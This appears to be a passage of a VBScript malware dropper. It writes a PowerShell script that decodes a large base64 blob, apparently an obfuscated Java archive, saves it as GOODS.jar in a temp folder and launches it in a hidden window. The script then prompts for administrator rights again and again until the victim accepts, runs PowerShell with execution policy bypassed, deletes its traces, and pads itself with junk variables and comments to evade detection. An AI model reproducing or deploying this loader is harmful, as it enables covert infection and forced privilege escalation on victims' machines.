fh.WriteLine "  $jb64+=""z66cPcIdPtyfOGHjmZt3jm6mjpyutB5X8KrSSd3pHTm9GV2Jid6M0qxp7kmuNVNvmv6/nZH46szx2p21C7O3ZleYjIPcobS9l9HEhz7hv7QOdtIixm7BTLN7U0ZvTi/1pjcrNJ1tdfGMqqyCFdrbHWsnKlTCCV4okTsT5nw4TxjJ7mfSLMZfmi0ATgQtulZGno3KcZhf"""
fh.WriteLine "  $jb64+=""dC27g6+zVSS3hSLG0VyaJ8jni2i3TJBzgZMu8l53V1pFzl57OJVBcBHnBd2pQYVcXOntVjvqrnZf7c537zbxHFePOUqPaYG92+Q192bsTZ5bwsmRvUNukUPuSF5EEaXpmExPeldOpG63NUgLVlXUT3ZPdBfo1MsZapu1DGWBrTdtT90k3kibcHOUDRKLMmuBEk4pWN+r"""
fh.WriteLine "  $jb64+=""LqivWG+cscLGif9hEb06W0NhxpNVAs3biOunlLC9w96lk60R8hCZN62LRSatACKumORV9k1TOnI6FFFXy660jlGcHih0o1jSJWBmAweEAoU26QC40hP0+cMqbRaTbdTMk/kK+QS1iCOilrZs4ojdplCr+ObVsmGaiiimbVrJFmpoDbdcpkxYr5KfAgK+OL4rNm/Opkxt"""
fh.WriteLine "  $jb64+=""cTBWBwmAXbvaLVPYRhFx+3S2HH9VwO/nEMAJFiGvMAmLmTQxxzayizp5HbGh5QuaTo0oFGorWRYOt4eGUcu0hzkWsbBulSWiehXay8bQMHWxQr2cSLDVrua0wRcK69m+Sh9hKVM3cc0SLOkd05XebVrYULG6dLmRg7o2lJXW57vzG0uv7VKnrCtytayZXFM6aZO9W14q"""
fh.WriteLine "  $jb64+=""B6d15SxsmLS2YtUU15xpN5TdNGO+qzt1j1x6dYT2pF3nqrdtTtsrL1w7iQ1s0prCVRXrp7iqTDtNm1ONVQrdwplwgqmER039cB7FHvFx+oS4wCeFonzhxQEtqRP+sl7M3kq3idnbdY9dHNCTN5U+rY9zcSE368JT6bPsgDz2OT0BXO0LtQe4EK4KeH1a0l6t0t10j6C4"""
fh.WriteLine "  $jb64+=""l18iTzSL3wV4B47R1dVifj8d4AyX7mdevK2h+MZf1Dc+GCcVySo9IAzmywSpySXTg+wRbT7/1jBH9q/wKTz1VR5qbvEEKw3vr1Lpa/SQmPm6lhdU6dscESPfENtUyfQt5r1gLbtoPQPWqkJ3wWo29WMiZRKVC3FVMCoc8Hq6NpZNn3nd9Fmls8oU+rYIz/cIvzkp0uOR"""
fh.WriteLine "  $jb64+=""Sn49hD8iaB4VZ2aJM7kSsKbW2TtyOhU6zU5VodAZFnObJ8QZt9fXKTKeEd2FBfUkPSW2eFr8LBDZHDJq9ZzC6pGTg2fprCD/DnuXz+/VXFGl53WX44qAlsj0PRt9HzX8Ev5r1kHkhyyVCnbrl0T23d4mYHQkuxox36Sf0E/F9j/jtRouKfQLvvCO7d7WIKPWyzpqvcII"""
fh.WriteLine "  $jb64+=""mVzIDati6FUbnRM4fo6yRY/rmTSP11sfaW8XqZTPK+qKpKPjpadm17+l39lwkDjRl9kaRQ6n0us6hP2BkDmstA637vDJ9Ce95DW+tUzafQkZ3+xN+rON3iBO+c11mpze1qKMr1mkdCMlXUlD7KHNeor4V/qb2IWrAofPHjZ55QWZXpN3dPN4l9xhbVXon6LM0xD8X0YV"""
fh.WriteLine "  $jb64+=""BL6weaqr1KnQBTbEdr2E9zRvXxP0NPPtPhABcDkNGeQmvqZZ975R7la/b0Vkx2ZfcI0QEAtSW1jraTe+7e5As6dtnSfYKr6NQVu8guVUXq1mbwxWsXmGRGZvqw9Egs0+oTTGRVcgEGYr9LTrsBhCARcYZmZiFFLEb6EQP0tyBay1mRC/X6SInzO17yyjzTbGc4zv0Rij"""
fh.WriteLine "  $jb64+=""tblamyKqY60da9CNM+a5GtbaCcY5+dq8nXsFmAiSTPx1B/Mj/lVbrPuOY7J9ynEUZu4azCyp6zkOp734OGZkVryVuXEvf5bSccyyCrpr7GXHMcc+9zjm2yuOY5HddRyLrZbdx7HkGG9GkrjiLKj8fhFWUzZSpb/wNf7FrCqYTF9FIVowgxoxW7oRc/BtLCAXXPQrpuf0"""
fh.WriteLine "  $jb64+=""Q2eNrHwBwVy3s6jGXXQS7gGsOIWVjacgNxY5T6L+JNZFwZ9NjSdxo1XusW8YgGcAW6LY1o9AFCF7hAe4Nb526V9R7KkR+zgfxe2Avkk/7rR/Tpu+79hgDX85ozggPrgCVOBHO5bDJAkDGgtpCAFxSRkHh7iVZJhlZpS/l8fvbcaPodBvkWpScJU0AeNpDuoRxCapGc2m"""
fh.WriteLine "  $jb64+=""OfDTvbxnFzqkN7CHnJKV1+VoptHJcrqfv/TeF0AZCr7E6pI0dY01LN48gC8nJG1lLvkmzIlYx+V0hk38VGGoeDZM2prRQlL9mDWAB0/iK1E8xIJgtSW2sWni3oYcKZM34GrY2GALbyAOmHgKRxrt32QxncS3Gmsa7cc0iZ2I4qT5yGCNYt19RKO7ii1wOTNs0fe8kQW1"""
fh.WriteLine "  $jb64+=""KCacPGYWpkVIl9ayHc9FHpVhHBVjvCmfz7TGmJZG8UUEN2/04/FnMZ7fUZzpx5NRPNOPs1E8z7b4eB8smrJiJmDdZ/+uxhLrv1DXNOvwFAb52oX9YJt5kVcN4Ifadj85jie1zi+O4ywTsHEzDRs3S0Rsy+eOu9y5Zre+64x+lF5x1xnarqViV7cwspd1I8vCKwP4Td/Q"""
fh.WriteLine "  $jb64+=""ZDFYFMXv+oZyByEsfiy76SN88QnYxW0+Qlrbg7txH7edeA7Pc/tTvIJzOGUI2YVUbNCl/AjexWruurg7xJuQGNJeHdpIlrDXR4zBU0OsH92SNeUcwBQWfRBWug2qqZSh4j6GkjEYS/3Il5wMGyb20glYbcrCWk5VNtB8bKVHsQN/RIjexC7pIXTSOvSwCm+RfoZbpUbc"""
fh.WriteLine "  $jb64+=""iWdwt3QU99Fd+Dw9ia9J/8bD9CJOSGfwuLQXT0kv4TlpBd9Kxgv0Ct/s73jFlIlz5MGvpXF4nWHxT3iQjYOTcAMZHoRFGAeV9TP+zI3iT/vJmQQDb2ow8Jb9HR0O7H/T2wH8S7OMObplMHYl1vBGPBdbqUHGFcjeieHMlcn+diUyixIje29EsgG8XzOAof1IdxAxhbsP"""
fh.WriteLine "  $jb64+=""qYMOMomusQU7nL6Fky1/Vnx9PxbF+0Xx/ZjyKNu13hh2MwGWd/EWa/8CIJPlAqwyzg+hPGYTmlGUcZwCvYZUuh0LpXXYQgruMJlwAk/jZekOnJPK8HvpPN6WluNdOk9Fpg00y1TOcSifIVyHrVvZsEW7zFlr8F4cJdvpKKU5aFQclQfIYbgVu8w17FaN7EU1xc71TUVM"""
fh.WriteLine "  $jb64+=""HaWc2DtXv4LgbjybjSRVo4BexQxpKQcUFyoYghebzBxKlmrAqjIqSViix9FhIGnFRgPjtgsE5zbdOUATGhuiNPHoYIPzqDaWwu4Vg/9cAf8xpxnS2/MJ7LeL4G5aD6v0AQtsM1Tp9TgLvHk8lHMGY4immw8WbYXTXdSPxQN0dY0hIufpARIoliyiWgahYl0M3HPqDQvk"""
fh.WriteLine "  $jb64+=""WFwgeVrULIeNCtibH0IpilFuKsYC3JYkjPkXCwMpNI2cBk+PG+C7zCngyUHFOmg5aAZ3HFQqDJauGaCyU1TO2mKRFZ6kOTUNzM91wkwb2B4HaAHDU6PzJC1sEFG0hONQeVyM42AaYstKjqJUziaoSdKqXWQKiymdcph0CVvSGZRQHmbTX1FORzCH9rCWH+WK4f3hGibz"""
fh.WriteLine "  $jb64+=""RRrOj0Uxxm0L/4Hs/VhygFITPuSgyovyBgdVJScOImHIWJKxsOdxnDc33tDIruug65mivlEKO2ip1sv4gLvVevd97tbo3QvcrdW7/8fdOq3rPr2Ak6XGirGHsKho3Ky55lNoS8pjOPfYlmvWDz5JK6NUfwDpfChnV7zsyOAtJhrXN/QMe3PyOsuIF1kbN53YTql8Zd7J"""
fh.WriteLine "  $jb64+=""dMTMb/MRlsaROCDUQR5iZ+V85jwrg7gCoiFcm6QmS2xGWD2GRDA35qSkVZg/BC3Z1hQ5V6Sf9HGmdeNa6UHskxbhLul2RFlFj+FXeIK/X6BtfNhzZJWuY3jxkWqyUbrJqaUhPfE8hjQvsrC9NSQMXstaTGNglpqTXM2iG7i2gZE80WJ2NLHRuQQEO6jxEpE1JeveQTcl"""
fh.WriteLine "  $jb64+=""ssYB2uh2EJN7aoXkizSRep0iAMHmoC1iolhveewAMgaoJTGTbHHb9DRlgLaLxLTMQGqtU6wfpmNBDOqL/iMWFF2EBRatyGAYulGoRfufq8mrgodBN2OOdA/DQB2qKIy1kg034tNopcc4t3VgJ30Kh6V+DtQ+nMU8/FCK4uf4A15FdjJkiPLfyNfSYNOM4TmGMQftEExS"""
fh.WriteLine "  $jb64+=""B0uAP0L6x348fIoiQmg7Bb7uPkPdnENKYWeTcKIe53oH3axRflQDmY9p/U9F6Y4o3Rmlu6J0X2bdm5mlL/c8gE0MNJ+vzew+kykv7HlMYZ9cYchprrl4OnvQdA4tX2gss2RcsOx+AJm5ZidL9ZkofakP+YO57G7nG6ezHrItJ+kQC7OhuG/oBWGvgyzWo0X811B0VMsx"""
fh.WriteLine "  $jb64+=""voxn+aKHOF0S7Wk8obVP4imtfZpzm2fjmHYnUi5grBZBvewo1K1J/WmZDstoEl7ytEjIEr5kvYiEhEPlxAnMIxDwTNMQ27Ckz4gFJPDufPKHeVhE2sz5m0QrOIcrxxSqwAzsRJWUhzpJwWpqwVquv26gbPikE9hGJziHO4Sb8T7u4KTjPqkF99O3cBArcYi1HJXew2PS"""
fh.WriteLine "  $jb64+=""Tjwp9eBpKYPvfgvOSqOSIPhsPMLlx0PrMQ7RQj5dzhVm6z6GwX2Mip3cSuHOfYp5N8NlJz+xCSnc2Llv+hlW0Yoo9TU+ZmH1blQsu71N89xl5qaGBQ33o7Boet76KD18C4bG7vvc2rz7kcMj/CUGs81iqG/oZaFmNrdvJhKeLBG9l8FCMh0VECYAbmqcfTMiBvuiVo6V"""
fh.WriteLine "  $jb64+=""T01GhVzioH4t8J3QSuS9maPe1UtkbWRGZuMrmeW9okp2UJRL4kRZpZU89DxU2oQc6sN4KReFpgbWxB4tQBn4Zr6XpaQwp23OFf2YvF/aMkADZWb73Nps80HMyTZriHCqRtyKo+rjjbUOGtSRZj9yGZpq2aKL2Yue0DyHrf252nhEaKwRcEbf3Q+HCDAspj6rebeXaRjU"""
fh.WriteLine "  $jb64+=""BvSd3YkyyhmHw1P0/caT9GKUfqChz4/i6DPXUmyESeHai0Zae1EYZfofa/Q/56NnxXbpw7xBnvllbKfpCXBO7JRYatEzXW2pHv3aGnMtOhBr71+donPayK9raK61wcm4+Bvns1iZa30Woxk3XuvDYnZ0d66VZ873oVwfK3UXNc61Ds6VmbZA0I4R47lyH7LduXKMOEUf"""
fh.WriteLine "  $jb64+=""1OIuS1w78I81gtVhcq9JiOYA1gzQWxljMgKx7ME0vb7R7KB3tEyAHSLXomUMnPRq6QJnvgz1Wrrg5PfWjPFcJyzm3sKMpT3F9VH6R4OD3tUM8d9Z9J6oIt9/aa45UQWbHPS+Hl1EDnEgXgbzl4QBrMiSSFt0sLbv/QPHOO9bTxvIi4PkplUUMdo9ImLTrfQZ/o7QXvHN"""
fh.WriteLine "  $jb64+=""tvm2NIvR7h3yiJa8UolopQ2SV9rKtaiGgjQeWUYywLZvwNJSkTeYoeOUBnOTtEwieeQjw5BRZBKHjVltk7IhxqlEriHLdG4YhZY5HkxZos1b9Hk9I9HnedxY7IAywmRsPtVUaTBxyRYWweZeHhcjF49nJt1YYO8QrtEvrd9xuVZuv8cyitXZEle6ivQaF1djkUFbkG1a"""
fh.WriteLine "  $jb64+=""yMhwDoU0C9ew3OdI83nVUcbnA9ggpcNvGsfV/yn0SU/hBI3GO1IWPsB6KsTLjOrbWWt1tApnWYPbWVtn6RD20lFRcdMFetFUJeXTddI06Sess8OstR9J10hzpHXSRqnJNJE1OCi18Ph207oElkvbDDA0caQQlQ1L3fj1SRREKnKlFAGssEg2Y80nOTR1sya7/x9QSwcI"""
fh.WriteLine "  $jb64+=""9FEJ6WMXAAAwKwAAUEsDBBQACAgIAAU801wAAAAAAAAAAAAAAAAHAAAASi5jbGFzc1VR21ITQRA9s5tkk7AJay7gDYkWYAiBgCBeUKsoDBRhYwqIYOHTZjOVLK67cZMof6C/4BfwZoklSvkg777w4E/4FcbeTajIVM1Md8/p091nfv398RPAApYYWEECY1D2tbdaztSs"""
fh.WriteLine "  $jb64+=""Wq5U2ed6S4LIEOtHt9qWpVVMLsFPSZwhuLppP3+xtvFGQpAh8MiwjNYTMtJqbWlyR0YYAwRcYwir50gqF1lW1eVyaWv94Gm+WGIQCU3V031MLz2CaAgCYjIGobhWgsDpLvFQGD4ME7vmEhSIQHTaFkO8327+QOeNlmFbEq4TsE57T8YNjIYQQsoPb8U/XBi8XHe4VpUw"""
fh.WriteLine "  $jb64+=""xuBvmpw3GHzpgltyArfDGEeaWFQZGbeBEKbIq0mYpisvI+cGZzB7oQtitN91VbtDZCt2lYQbVA2LP2u/rnCn7L6RzKqta+aO5hiu3wtGtlua/qqoNXq+vG5Z3FkxtWaTN4klb+mm3TSsWpG36naVdN62247OVw2TI0WC+UC/AUFRXC0BuklJmlqgHcYlel0gaxN+iK4W"""
fh.WriteLine "  $jb64+=""mexGMZPdezl1jPgxkt9x+cgD36UzQGCfGMQi2SmC+4jqCq6S17Wi7rtnKZTBcA1DPfozzwfmvuDmR0wncOsEkyfIZg4xfLr7vxsETnczX5H8hrnDzu8jSgwQZQIjSNLHjdMt4h5RLUJCBzGymIT5TvcW3GOkQ6Oeh4V+eJmMoDfIDAZopjME2GfI7A8UMUcVxpAUo9R0"""
fh.WriteLine "  $jb64+=""A6N4TJU+YUJ4j1lx3htY7g7QG1jEfU8/5unorgeeDCHCPfQEk/4BUEsHCKflmd5OAgAAXwMAAFBLAQIUABQACAgIAAU801wAAAAAAgAAAAAAAAAJAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi/+ygAAUEsBAhQAFAAICAgABTzTXK33KdpaAAAAWwAAABQAAAAAAAAA"""
fh.WriteLine "  $jb64+=""AAAAAAAAPQAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQAFAAICAgABTzTXEFNeXl8BAAAqAcAAAcAAAAAAAAAAAAAAAAA2QAAAEYuY2xhc3NQSwECFAAUAAgICAAFPNNcXssrB+IDAADqBgAABwAAAAAAAAAAAAAAAACKBQAAZy5jbGFzc1BLAQIUABQACAgIAAU8"""
fh.WriteLine "  $jb64+=""01x2M0ILJxIAAKshAAAHAAAAAAAAAAAAAAAAAKEJAABrLmNsYXNzUEsBAhQAFAAICAgABTzTXPRRCeljFwAAMCsAAA4AAAAAAAAAAAAAAAAA/RsAAEZRb1VYR0txLmNsYXNzUEsBAhQAFAAICAgABTzTXKflmd5OAgAAXwMAAAcAAAAAAAAAAAAAAAAAnDMAAEouY2xh"""
fh.WriteLine "  $jb64+=""c3NQSwUGAAAAAAcABwCNAQAAHzYAADoAT2JmdXNjYXRpb24gYnkgQWxsYXRvcmkgT2JmdXNjYXRvciBodHRwOi8vd3d3LmFsbGF0b3JpLmNvbQ=="""
fh.WriteLine "  $jbytes=[Convert]::FromBase64String($jb64)"
fh.WriteLine "  $jar=""$tmp\GOODS.jar"""
fh.WriteLine "  [IO.File]::WriteAllBytes($jar,$jbytes)"
fh.WriteLine "  if(Test-Path $jar){Start-Process -FilePath $jexe -ArgumentList @(""-jar"",""$jar"") -WindowStyle Hidden}"
fh.WriteLine "}"
fh.Close
Dim zoexnqIb:zoexnqIb=False
Dim kKJsBZ:kKJsBZ=5458
If False Then
XKziNEC=1399
End If
Dim dUumhTe:dUumhTe=5855
Rem b14e4f72

Dim oApp:Set oApp=CreateObject("Shell.Application")
Dim psArgs:psArgs="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "+Chr(34)+tf+Chr(34)+" -sf "+Chr(34)+sf+Chr(34)
Do
  Dim fw:Set fw=FSO.CreateTextFile(sf,True,False)
  fw.WriteLine "w":fw.Close
  oApp.ShellExecute "powershell.exe",psArgs,"","runas",1
  WScript.Sleep 2000
Loop While FSO.FileExists(sf)
'1ff8214d527f66
Dim lmTrMx:lmTrMx=3154
'780540ec6e77b0
Dim BWsEQdd:BWsEQdd=False

WScript.Sleep 3000
If FSO.FileExists(tf) Then FSO.DeleteFile tf,True